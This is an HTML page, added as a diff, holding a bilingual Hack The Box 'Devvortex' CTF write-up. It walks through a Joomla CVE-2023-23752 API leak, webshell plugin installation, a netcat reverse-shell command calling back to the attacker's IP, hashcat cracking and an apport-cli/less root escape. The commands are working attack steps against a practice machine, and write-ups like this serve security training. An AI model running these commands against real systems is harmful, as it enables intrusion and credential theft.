@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>devvortex | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">devvortex</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began with the discovery of a development subdomain hosting Joomla CMS version 4.2.6. This version was vulnerable to CVE-2023-23752, an improper access control issue that allowed unauthorized access to webservice endpoints without authentication.</p>
+                    
+                    <p>By exploiting this vulnerability, I accessed the Joomla API to extract user credentials and configuration details. The leaked credentials provided access to the administrator panel, where I uploaded a custom webshell plugin to achieve remote code execution as the <code>www-data</code> user.</p>
+                    
+                    <p>From the initial foothold, I discovered MySQL database credentials in the Joomla configuration. Using these credentials, I accessed the database and extracted a bcrypt password hash for user <code>logan</code>, which I successfully cracked using hashcat.</p>
+                    
+                    <p>The final privilege escalation leveraged a sudo permission on <code>/usr/bin/apport-cli</code>. Version 2.20.11 of apport-cli was vulnerable to CVE-2023-1326, which allowed command execution through the <code>less</code> pager when viewing crash reports. By invoking the shell escape feature in less, I obtained a root shell.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Joomla CMS 4.2.6 API unauthorized access (CVE-2023-23752), webshell plugin injection, MySQL credential extraction and bcrypt hash cracking, apport-cli privilege escalation through less pager (CVE-2023-1326).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image5.png" alt="Nmap scan results showing open ports including SSH and HTTP services" /></p>
+
+                <p>The scan reveals standard web services. I add <code>devvortex.htb</code> to <code>/etc/hosts</code> to proceed with web enumeration.</p>
+
+                <h2>Web Enumeration - Virtual Host Discovery</h2>
+                <p>The main website at <code>devvortex.htb</code> appears to be a simple static site without obvious vulnerabilities. Running gobuster on the main domain doesn't reveal anything unusual.</p>
+
+                <p>However, performing virtual host enumeration reveals an interesting development subdomain:</p>
+                <p><img src="./media/image7.png" alt="Virtual host discovery showing dev.devvortex.htb subdomain" /></p>
+
+                <p>I add <code>dev.devvortex.htb</code> to <code>/etc/hosts</code> and begin enumerating this subdomain.</p>
+
+                <h2>Development Site Analysis</h2>
+                <p>Running gobuster against the development subdomain yields much more interesting results:</p>
+                <p><img src="./media/image6.png" alt="Gobuster results showing various Joomla directories and endpoints" /></p>
+
+                <p>The directory structure and file organization suggest this is a Content Management System. Running Wappalyzer confirms this is a Joomla installation. The presence of <code>/administrator</code>, <code>/api</code>, and other typical Joomla directories provides clear indicators of the CMS type.</p>
+
+                <h2>CMS Fingerprinting - Joomla Version Detection</h2>
+                <p>I use <code>cmseek</code> to perform automated CMS detection and vulnerability scanning:</p>
+                <p><img src="./media/image2.png" alt="CMSeek scan results identifying Joomla installation details" /></p>
+
+                <p>The <code>joomscan</code> tool specifically identifies this as <strong>Joomla version 4.2.6</strong>. This is a critical finding, as version information allows me to search for known vulnerabilities.</p>
+
+                <h3>Vulnerability Research</h3>
+                <p>Searching for vulnerabilities affecting Joomla 4.2.6, I find multiple issues, primarily XSS vulnerabilities. However, the most interesting discovery is <a href="https://www.cvedetails.com/cve/CVE-2023-23752/">CVE-2023-23752</a>.</p>
+
+                <p>This vulnerability is described as: <em>"An improper access check allows unauthorized access to webservice endpoints."</em></p>
+
+                <p>This is a critical authentication bypass that allows unauthenticated users to access Joomla's REST API endpoints, potentially exposing sensitive configuration data and user information.</p>
+
+                <h2>Exploiting CVE-2023-23752 - Information Disclosure</h2>
+                <p>I locate a proof-of-concept exploit: <a href="https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/blob/main/exploit.sh">https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/blob/main/exploit.sh</a></p>
+
+                <p>Using the commands from the exploit, I can query the unauthenticated API to extract user information:</p>
+                <pre><code class="language-bash">curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq '.data[] | select(.type == "users") | {id: .attributes.id, name: .attributes.name, username: .attributes.username, email: .attributes.email, groups: .attributes.group_names}'</code></pre>
+
+                <p>This reveals two users:</p>
+                <pre><code class="language-json">{
+  "id": 649,
+  "name": "lewis",
+  "username": "lewis",
+  "email": "lewis@devvortex.htb",
+  "groups": "Super Users"
+}
+{
+  "id": 650,
+  "name": "logan paul",
+  "username": "logan",
+  "email": "logan@devvortex.htb",
+  "groups": "Registered"
+}</code></pre>
+
+                <p>The user <code>lewis</code> is particularly interesting as they belong to the "Super Users" group, which has administrative privileges in Joomla.</p>
+
+                <p>Querying another configuration endpoint exposes database credentials:</p>
+                <pre><code class="language-json">{
+  "user": "lewis",
+  "id": 224
+}
+{
+  "password": "P4ntherg0t1n5r3c0n##",
+  "id": 224
+}</code></pre>
+
+                <p>These credentials (<code>lewis:P4ntherg0t1n5r3c0n##</code>) provide access to the Joomla administrator panel.</p>
+
+                <h2>Administrator Access - Webshell Installation</h2>
+                <p>Upon logging into the administrator panel at <code>http://dev.devvortex.htb/administrator</code>, I'm immediately presented with system information:</p>
+                <p><img src="./media/image3.png" alt="Joomla administrator dashboard showing version and system information" /></p>
+
+                <p>With administrative access, I can install plugins - a common technique for achieving code execution on CMS platforms, similar to WordPress plugin abuse.</p>
+
+                <p>I use a Joomla webshell plugin from: <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">https://github.com/p0dalirius/Joomla-webshell-plugin</a></p>
+
+                <p>After installing the malicious plugin through the administrator interface, I can execute commands via the following endpoint:</p>
+                <pre><code class="language-bash">curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data "action=exec&cmd=id"</code></pre>
+
+                <p>The response confirms remote code execution:</p>
+                <pre><code class="language-json">{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}</code></pre>
+
+                <h2>Initial Access - Reverse Shell</h2>
+                <p>Now that I have RCE through the webshell, I can upgrade to a full reverse shell. I set up a netcat listener:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Then execute a reverse shell command through the webshell:</p>
+                <pre><code class="language-bash">curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data 'action=exec&cmd=busybox nc 10.10.16.6 443 -e bash'</code></pre>
+
+                <p>This grants me shell access as the <code>www-data</code> user.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After establishing the shell, I perform basic enumeration:</p>
+
+                <p>Checking the home directory reveals a user named <code>logan</code>. Running <code>ss -tuln</code> shows that MySQL is listening locally on the standard port 3306.</p>
+
+                <p>Since I already have database credentials from the earlier API leak, I can access MySQL directly:</p>
+                <pre><code class="language-bash">mysql -u lewis -p'P4ntherg0t1n5r3c0n##'</code></pre>
+
+                <p>Exploring the Joomla database, I find the users table and extract the password hash for <code>logan</code>:</p>
+                <pre><code class="language-plaintext">$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code></pre>
+
+                <p>This is a bcrypt hash (indicated by the <code>$2y$</code> prefix). I save this hash and use hashcat to crack it:</p>
+                <pre><code class="language-bash">hashcat -m 3200 -a 0 -o found.txt hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Hashcat successfully cracks the hash, revealing the password: <code>tequieromucho</code></p>
+
+                <p>I can now escalate to the <code>logan</code> user:</p>
+                <pre><code class="language-bash">su logan</code></pre>
+
+                <p>With these credentials, I successfully retrieve the user flag from logan's home directory.</p>
+
+                <h2>Privilege Escalation - Sudo Permissions Analysis</h2>
+                <p>After gaining access as <code>logan</code>, I check for sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals an interesting permission:</p>
+                <pre><code class="language-plaintext">User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli</code></pre>
+
+                <p>The <code>apport-cli</code> utility is Ubuntu's crash reporting tool. Having sudo access to this binary without a password is unusual and potentially exploitable.</p>
+
+                <p>Checking the help output reveals version information and available options:</p>
+                <p><img src="./media/image1.png" alt="Apport-cli help output showing version 2.20.11 and available commands" /></p>
+
+                <p>The version is <strong>2.20.11</strong>. I search for known vulnerabilities affecting this version.</p>
+
+                <h2>Exploiting CVE-2023-1326 - Apport Privilege Escalation</h2>
+                <p>I find a vulnerability affecting apport-cli versions 2.26 and earlier: <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">CVE-2023-1326</a></p>
+
+                <p>The vulnerability works as follows: when viewing crash reports through <code>apport-cli</code>, the tool uses <code>less</code> as its pager to display the report contents. Since we can run apport-cli with sudo, this effectively gives us the ability to run <code>less</code> as root.</p>
+
+                <p>The <code>less</code> pager has a well-known feature that allows executing shell commands by typing <code>!</code> followed by a command. This means we can escape to a root shell.</p>
+
+                <h3>Executing the Privilege Escalation</h3>
+                <p>I execute <code>apport-cli</code> with sudo and the <code>--file-bug</code> option:</p>
+                <pre><code class="language-bash">sudo /usr/bin/apport-cli --file-bug</code></pre>
+
+                <p>The tool prompts me to select a package and choose various options. Eventually, it offers to view the report:</p>
+                <p><img src="./media/image4.png" alt="Apport-cli prompt offering to view the crash report" /></p>
+
+                <p>When I select the option to view the report (V), it opens in the <code>less</code> pager running as root. Now I simply type the following to escape to a root shell:</p>
+                <pre><code class="language-bash">!/bin/bash</code></pre>
+
+                <p>This spawns a bash shell with root privileges:</p>
+                <pre><code class="language-plaintext">Please choose (S/V/K/I/C): V
+
+root@devvortex:/home/logan# whoami
+root</code></pre>
+
+                <p>With root access, I can retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó con el descubrimiento de un subdominio de desarrollo que alojaba Joomla CMS versión 4.2.6. Esta versión era vulnerable a CVE-2023-23752, un problema de control de acceso inadecuado que permitía el acceso no autorizado a endpoints de servicios web sin autenticación.</p>
+                    
+                    <p>Explotando esta vulnerabilidad, accedí a la API de Joomla para extraer credenciales de usuario y detalles de configuración. Las credenciales filtradas proporcionaron acceso al panel de administrador, donde subí un plugin de webshell personalizado para lograr la ejecución remota de código como usuario <code>www-data</code>.</p>
+                    
+                    <p>Desde el punto de apoyo inicial, descubrí credenciales de base de datos MySQL en la configuración de Joomla. Usando estas credenciales, accedí a la base de datos y extraje un hash de contraseña bcrypt para el usuario <code>logan</code>, que crackeé exitosamente usando hashcat.</p>
+                    
+                    <p>La escalada de privilegios final aprovechó un permiso sudo en <code>/usr/bin/apport-cli</code>. La versión 2.20.11 de apport-cli era vulnerable a CVE-2023-1326, que permitía la ejecución de comandos a través del paginador <code>less</code> al visualizar informes de fallos. Invocando la función de escape de shell en less, obtuve una shell root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Acceso no autorizado a API de Joomla CMS 4.2.6 (CVE-2023-23752), inyección de plugin webshell, extracción de credenciales MySQL y crackeo de hash bcrypt, escalada de privilegios en apport-cli mediante paginador less (CVE-2023-1326).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image5.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH y servicios HTTP" /></p>
+
+                <p>El escaneo revela servicios web estándar. Añado <code>devvortex.htb</code> a <code>/etc/hosts</code> para proceder con la enumeración web.</p>
+
+                <h2>Enumeración Web - Descubrimiento de Virtual Host</h2>
+                <p>El sitio web principal en <code>devvortex.htb</code> parece ser un sitio estático simple sin vulnerabilidades obvias. Ejecutar gobuster en el dominio principal no revela nada inusual.</p>
+
+                <p>Sin embargo, al realizar enumeración de virtual hosts descubro un interesante subdominio de desarrollo:</p>
+                <p><img src="./media/image7.png" alt="Descubrimiento de virtual host mostrando el subdominio dev.devvortex.htb" /></p>
+
+                <p>Añado <code>dev.devvortex.htb</code> a <code>/etc/hosts</code> y comienzo a enumerar este subdominio.</p>
+
+                <h2>Análisis del Sitio de Desarrollo</h2>
+                <p>Ejecutar gobuster contra el subdominio de desarrollo arroja resultados mucho más interesantes:</p>
+                <p><img src="./media/image6.png" alt="Resultados de gobuster mostrando varios directorios y endpoints de Joomla" /></p>
+
+                <p>La estructura de directorios y organización de archivos sugiere que esto es un Sistema de Gestión de Contenidos. Ejecutar Wappalyzer confirma que es una instalación de Joomla. La presencia de <code>/administrator</code>, <code>/api</code> y otros directorios típicos de Joomla proporciona indicadores claros del tipo de CMS.</p>
+
+                <h2>Fingerprinting del CMS - Detección de Versión de Joomla</h2>
+                <p>Uso <code>cmseek</code> para realizar detección automatizada del CMS y escaneo de vulnerabilidades:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de CMSeek identificando detalles de la instalación de Joomla" /></p>
+
+                <p>La herramienta <code>joomscan</code> identifica específicamente que es <strong>Joomla versión 4.2.6</strong>. Este es un hallazgo crítico, ya que la información de versión me permite buscar vulnerabilidades conocidas.</p>
+
+                <h3>Investigación de Vulnerabilidades</h3>
+                <p>Buscando vulnerabilidades que afecten a Joomla 4.2.6, encuentro múltiples problemas, principalmente vulnerabilidades XSS. Sin embargo, el descubrimiento más interesante es <a href="https://www.cvedetails.com/cve/CVE-2023-23752/">CVE-2023-23752</a>.</p>
+
+                <p>Esta vulnerabilidad se describe como: <em>"Una comprobación de acceso inadecuada permite el acceso no autorizado a endpoints de servicios web."</em></p>
+
+                <p>Esta es una omisión crítica de autenticación que permite a usuarios no autenticados acceder a los endpoints REST API de Joomla, exponiendo potencialmente datos sensibles de configuración e información de usuarios.</p>
+
+                <h2>Explotando CVE-2023-23752 - Divulgación de Información</h2>
+                <p>Localizo una prueba de concepto del exploit: <a href="https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/blob/main/exploit.sh">https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/blob/main/exploit.sh</a></p>
+
+                <p>Usando los comandos del exploit, puedo consultar la API no autenticada para extraer información de usuarios:</p>
+                <pre><code class="language-bash">curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq '.data[] | select(.type == "users") | {id: .attributes.id, name: .attributes.name, username: .attributes.username, email: .attributes.email, groups: .attributes.group_names}'</code></pre>
+
+                <p>Esto revela dos usuarios:</p>
+                <pre><code class="language-json">{
+  "id": 649,
+  "name": "lewis",
+  "username": "lewis",
+  "email": "lewis@devvortex.htb",
+  "groups": "Super Users"
+}
+{
+  "id": 650,
+  "name": "logan paul",
+  "username": "logan",
+  "email": "logan@devvortex.htb",
+  "groups": "Registered"
+}</code></pre>
+
+                <p>El usuario <code>lewis</code> es particularmente interesante ya que pertenece al grupo "Super Users", que tiene privilegios administrativos en Joomla.</p>
+
+                <p>Consultando otro endpoint de configuración expongo credenciales de base de datos:</p>
+                <pre><code class="language-json">{
+  "user": "lewis",
+  "id": 224
+}
+{
+  "password": "P4ntherg0t1n5r3c0n##",
+  "id": 224
+}</code></pre>
+
+                <p>Estas credenciales (<code>lewis:P4ntherg0t1n5r3c0n##</code>) proporcionan acceso al panel de administrador de Joomla.</p>
+
+                <h2>Acceso de Administrador - Instalación de Webshell</h2>
+                <p>Al iniciar sesión en el panel de administrador en <code>http://dev.devvortex.htb/administrator</code>, se me presenta inmediatamente información del sistema:</p>
+                <p><img src="./media/image3.png" alt="Panel de administrador de Joomla mostrando versión e información del sistema" /></p>
+
+                <p>Con acceso administrativo, puedo instalar plugins - una técnica común para lograr ejecución de código en plataformas CMS, similar al abuso de plugins de WordPress.</p>
+
+                <p>Uso un plugin webshell de Joomla de: <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">https://github.com/p0dalirius/Joomla-webshell-plugin</a></p>
+
+                <p>Después de instalar el plugin malicioso a través de la interfaz de administrador, puedo ejecutar comandos mediante el siguiente endpoint:</p>
+                <pre><code class="language-bash">curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data "action=exec&cmd=id"</code></pre>
+
+                <p>La respuesta confirma la ejecución remota de código:</p>
+                <pre><code class="language-json">{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}</code></pre>
+
+                <h2>Acceso Inicial - Reverse Shell</h2>
+                <p>Ahora que tengo RCE a través de la webshell, puedo actualizar a una reverse shell completa. Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto un comando de reverse shell a través de la webshell:</p>
+                <pre><code class="language-bash">curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data 'action=exec&cmd=busybox nc 10.10.16.6 443 -e bash'</code></pre>
+
+                <p>Esto me concede acceso shell como usuario <code>www-data</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Después de establecer la shell, realizo enumeración básica:</p>
+
+                <p>Verificar el directorio home revela un usuario llamado <code>logan</code>. Ejecutar <code>ss -tuln</code> muestra que MySQL está escuchando localmente en el puerto estándar 3306.</p>
+
+                <p>Dado que ya tengo credenciales de base de datos de la filtración de API anterior, puedo acceder a MySQL directamente:</p>
+                <pre><code class="language-bash">mysql -u lewis -p'P4ntherg0t1n5r3c0n##'</code></pre>
+
+                <p>Explorando la base de datos de Joomla, encuentro la tabla de usuarios y extraigo el hash de contraseña de <code>logan</code>:</p>
+                <pre><code class="language-plaintext">$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code></pre>
+
+                <p>Este es un hash bcrypt (indicado por el prefijo <code>$2y$</code>). Guardo este hash y uso hashcat para crackearlo:</p>
+                <pre><code class="language-bash">hashcat -m 3200 -a 0 -o found.txt hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Hashcat crackea exitosamente el hash, revelando la contraseña: <code>tequieromucho</code></p>
+
+                <p>Ahora puedo escalar al usuario <code>logan</code>:</p>
+                <pre><code class="language-bash">su logan</code></pre>
+
+                <p>Con estas credenciales, recupero exitosamente la flag de usuario del directorio home de logan.</p>
+
+                <h2>Escalada de Privilegios - Análisis de Permisos Sudo</h2>
+                <p>Después de obtener acceso como <code>logan</code>, compruebo los privilegios sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela un permiso interesante:</p>
+                <pre><code class="language-plaintext">User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli</code></pre>
+
+                <p>La utilidad <code>apport-cli</code> es la herramienta de reporte de fallos de Ubuntu. Tener acceso sudo a este binario sin contraseña es inusual y potencialmente explotable.</p>
+
+                <p>Verificar la salida de ayuda revela información de versión y opciones disponibles:</p>
+                <p><img src="./media/image1.png" alt="Salida de ayuda de apport-cli mostrando versión 2.20.11 y comandos disponibles" /></p>
+
+                <p>La versión es <strong>2.20.11</strong>. Busco vulnerabilidades conocidas que afecten a esta versión.</p>
+
+                <h2>Explotando CVE-2023-1326 - Escalada de Privilegios en Apport</h2>
+                <p>Encuentro una vulnerabilidad que afecta a apport-cli versiones 2.26 y anteriores: <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">CVE-2023-1326</a></p>
+
+                <p>La vulnerabilidad funciona de la siguiente manera: al visualizar informes de fallos a través de <code>apport-cli</code>, la herramienta usa <code>less</code> como su paginador para mostrar los contenidos del informe. Dado que podemos ejecutar apport-cli con sudo, esto efectivamente nos da la capacidad de ejecutar <code>less</code> como root.</p>
+
+                <p>El paginador <code>less</code> tiene una función bien conocida que permite ejecutar comandos de shell escribiendo <code>!</code> seguido de un comando. Esto significa que podemos escapar a una shell root.</p>
+
+                <h3>Ejecutando la Escalada de Privilegios</h3>
+                <p>Ejecuto <code>apport-cli</code> con sudo y la opción <code>--file-bug</code>:</p>
+                <pre><code class="language-bash">sudo /usr/bin/apport-cli --file-bug</code></pre>
+
+                <p>La herramienta me pide seleccionar un paquete y elegir varias opciones. Eventualmente, ofrece ver el informe:</p>
+                <p><img src="./media/image4.png" alt="Prompt de apport-cli ofreciendo visualizar el informe de fallo" /></p>
+
+                <p>Cuando selecciono la opción de ver el informe (V), se abre en el paginador <code>less</code> ejecutándose como root. Ahora simplemente escribo lo siguiente para escapar a una shell root:</p>
+                <pre><code class="language-bash">!/bin/bash</code></pre>
+
+                <p>Esto genera una shell bash con privilegios root:</p>
+                <pre><code class="language-plaintext">Please choose (S/V/K/I/C): V
+
+root@devvortex:/home/logan# whoami
+root</code></pre>
+
+                <p>Con acceso root, puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
